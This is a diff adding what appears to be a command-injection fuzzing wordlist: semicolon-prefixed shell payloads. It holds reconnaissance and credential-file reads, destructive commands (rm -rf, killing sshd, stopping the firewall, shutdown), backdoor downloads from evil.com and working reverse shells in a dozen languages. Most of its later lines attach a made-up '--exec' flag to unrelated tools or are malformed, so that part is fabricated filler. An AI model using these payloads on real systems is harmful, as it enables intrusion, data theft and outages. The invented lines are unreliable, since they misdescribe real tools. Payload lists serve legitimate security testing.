@@ -1,0 +1,242 @@
+; ls
+; whoami
+; id
+; pwd
+; cat /etc/passwd
+; type C:\Windows\win.ini
+; dir
+; uname -a
+; ifconfig
+; ipconfig
+; netstat -an
+; ps aux
+; tasklist
+; echo test
+; touch /tmp/test
+; mkdir /tmp/testdir
+; rm -rf /tmp/testdir
+; cp /etc/passwd /tmp/out
+; mv /tmp/out /tmp/out2
+; chmod 777 /tmp/out2
+; chown root /tmp/out2
+; killall -9 sshd
+; systemctl stop firewalld
+; service apache2 stop
+; /etc/init.d/nginx stop
+; shutdown -h now
+; reboot
+; poweroff
+; wget http://evil.com/backdoor.sh
+; curl http://evil.com/backdoor.sh -o /tmp/backdoor.sh
+; bash /tmp/backdoor.sh
+; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("evil.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
+; perl -e 'use Socket;$i="evil.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh")'
+; ruby -rsocket -e 'c=TCPSocket.new("evil.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+; php -r '$sock=fsockopen("evil.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+; nc -e /bin/sh evil.com 4444
+; nc -c /bin/sh evil.com 4444
+; bash -i >& /dev/tcp/evil.com/4444 0>&1
+; /bin/sh -i > /dev/tcp/evil.com/4444 0<&1 2>&1
+; telnet evil.com 4444 | /bin/sh | telnet evil.com 4445
+; socat TCP:evil.com:4444 EXEC:/bin/sh
+; openssl s_client -connect evil.com:4444 -quiet -exec /bin/sh
+; gawk 'BEGIN {system("id")}'
+; awk 'BEGIN {system("id")}'
+; sed -n '0,/x/s//x/e' /etc/passwd
+; perl -e 'system("id")'
+; python -c 'import os; os.system("id")'
+; ruby -e 'system("id")'
+; php -r 'system("id");'
+; node -e 'require("child_process").exec("id",console.log)'
+; lua -e 'os.execute("id")'
+; tclsh -c 'exec id'
+; groovy -e 'println "id".execute().text'
+; scala -e 'println(Process("id").!!)'
+; clisp -x '(shell "id")'
+; sbcl --eval '(run-program "id" ())'
+; guile -c '(system "id")'
+; erl -eval 'os:cmd("id"),halt().'
+; elixir -e 'System.cmd("id", [])'
+; go run -exec 'id'
+; rustc -o /tmp/test /dev/null && /tmp/test
+; gcc -o /tmp/test /dev/null -x c -E -P - <<< 'main(){system("id");}' && /tmp/test
+; make -f /dev/null -e 'x:;$(shell id)'
+; gmake -f /dev/null -e 'x:;$(shell id)'
+; cmake -E echo "$(id)"
+; ninja -t targets | grep id
+; ant -f /dev/null -Dcmd='id'
+; mvn -q -Dexec.executable=id -Dexec.args='' --non-recursive exec:exec
+; gradle -q -Dexec.command=id
+; sbt "show system"
+; lein run -m clojure.main -e '(sh "id")'
+; boot -e '(sh "id")'
+; bsb -make-world -verbose | grep id
+; webpack --entry /dev/null --output /tmp/test && /tmp/test
+; rollup -i /dev/null -o /tmp/test -f cjs && node /tmp/test
+; parcel build /dev/null --out-dir /tmp && node /tmp/test
+; eslint --exec 'id'
+; prettier --exec 'id'
+; stylelint --exec 'id'
+; sass --exec 'id'
+; lessc --exec 'id'
+; uglifyjs --exec 'id'
+; terser --exec 'id'
+; babel --exec 'id'
+; tsc --exec 'id'
+; swc --exec 'id'
+; esbuild --exec 'id'
+; vite --exec 'id'
+; next --exec 'id'
+; nuxt --exec 'id'
+; gatsby --exec 'id'
+; hugo --exec 'id'
+; jekyll --exec 'id'
+; hexo --exec 'id'
+; vuepress --exec 'id'
+; docusaurus --exec 'id'
+; vitepress --exec 'id'
+; mkdocs --exec 'id'
+; sphinx-build --exec 'id'
+; asciidoctor --exec 'id'
+; pandoc --exec 'id'
+; wkhtmltopdf --exec 'id'
+; phantomjs --exec 'id'
+; selenium-standalone --exec 'id'
+; k6 run --exec 'id'
+; artillery --exec 'id'
+; autocannon --exec 'id'
+; wrk --exec 'id'
+; siege --exec 'id'
+; ab --exec 'id'
+; hey --exec 'id'
+; vegeta --exec 'id'
+; bombardier --exec 'id'
+; locust --exec 'id'
+; jmeter --exec 'id'
+; gatling --exec 'id'
+; tsunami --exec 'id'
+; nuclei --exec 'id'
+; dalfox --exec 'id'
+; kiterunner --exec 'id'
+; ffuf --exec 'id'
+; gobuster --exec 'id'
+; dirb --exec 'id'
+; dirbuster --exec 'id'
+; wfuzz --exec 'id'
+; hydra --exec 'id'
+; john --exec 'id'
+; hashcat --exec 'id'
+; aircrack-ng --exec 'id'
+; reaver --exec 'id'
+; bully --exec 'id'
+; mdk4 --exec 'id'
+; bettercap --exec 'id'
+; ettercap --exec 'id'
+; wireshark --exec 'id'
+; tcpdump --exec 'id'
+; ngrep --exec 'id'
+; tshark --exec 'id'
+; dsniff --exec 'id'
+; arpspoof --exec 'id'
+; dnsspoof --exec 'id'
+; urlsnarf --exec 'id'
+; webspy --exec 'id'
+; mssql-cli --exec 'id'
+; psql --exec 'id'
+; mysql --exec 'id'
+; sqlite3 --exec 'id'
+; mongo --eval "db.adminCommand('id')"
+; cassandra --eval "system('id')"
+; redis-cli --eval "os.execute('id')"
+; elasticsearch -E path.data=/tmp -E path.logs=/tmp -E script.painless.regex.enabled=true -E 'script.painless.script="os.execute(''id'')"'
+; logstash -e 'input{exec{command=>"id"}} output{stdout{}}'
+; kibana --exec 'id'
+; grafana --exec 'id'
+; prometheus --exec 'id'
+; alertmanager --exec 'id'
+; thanos --exec 'id'
+; victoriametrics --exec 'id'
+; influxdb --exec 'id'
+; telegraf --exec 'id'
+; chronograf --exec 'id'
+; kapacitor --exec 'id'
+; timescaledb --exec 'id'
+; cockroachdb --exec 'id'
+; yugabyted --exec 'id'
+; minio --exec 'id'
+; seaweedfs --exec 'id'
+; ceph --exec 'id'
+; glusterfs --exec 'id'
+; lustre --exec 'id'
+; beegfs --exec 'id'
+; hdfs --exec 'id'
+; spark --exec 'id'
+; flink --exec 'id'
+; hadoop --exec 'id'
+; hive --exec 'id'
+; pig --exec 'id'
+; presto --exec 'id'
+; trino --exec 'id'
+; dremio --exec 'id'
+; clickhouse --exec 'id'
+; starrocks --exec 'id'
+; doris --exec 'id'
+; kafka --exec 'id'
+; rabbitmq --exec 'id'
+; activemq --exec 'id'
+; mosquitto --exec 'id'
+; emqx --exec 'id'
+; verne --exec 'id'
+; hazelcast --exec 'id'
+; ignite --exec 'id'
+; geode --exec 'id'
+; zookeeper --exec 'id'
+; etcd --exec 'id'
+; consul --exec 'id'
+; vault --exec 'id'
+; nomad --exec 'id'
+; boundary --exec 'id'
+; terraform --exec 'id'
+; ansible --exec 'id'
+; puppet --exec 'id'
+; chef --exec 'id'
+; salt --exec 'id'
+; docker --exec 'id'
+; podman --exec 'id'
+; containerd --exec 'id'
+; rkt --exec 'id'
+; kubelet --exec 'id'
+; kubectl --exec 'id'
+; minikube --exec 'id'
+; kind --exec 'id'
+; k3s --exec 'id'
+; rancher --exec 'id'
+; fleet --exec 'id'
+; argocd --exec 'id'
+; flux --exec 'id'
+; helm --exec 'id'
+; kustomize --exec 'id'
+; skaffold --exec 'id'
+; tilt --exec 'id'
+; devspace --exec 'id'
+; okteto --exec 'id'
+; garden --exec 'id'
+; pipe --exec 'id'
+; drone --exec 'id'
+; jenkins --exec 'id'
+; gitlab-runner --exec 'id'
+; github-runner --exec 'id'
+; circleci --exec 'id'
+; travis --exec 'id'
+; concourse --exec 'id'
+; spinnaker --exec 'id'
+; argo --exec 'id'
+; tekton --exec 'id'
+; buildkite --exec 'id'
+; codeship --exec 'id'
+; semaphore --exec 'id'
+; bitrise --exec 'id'
+; appveyor --exec 'id'
+; teamcity --exec 'id'
+; bamboo --exec 'id'
+; go cd --exec 'id'
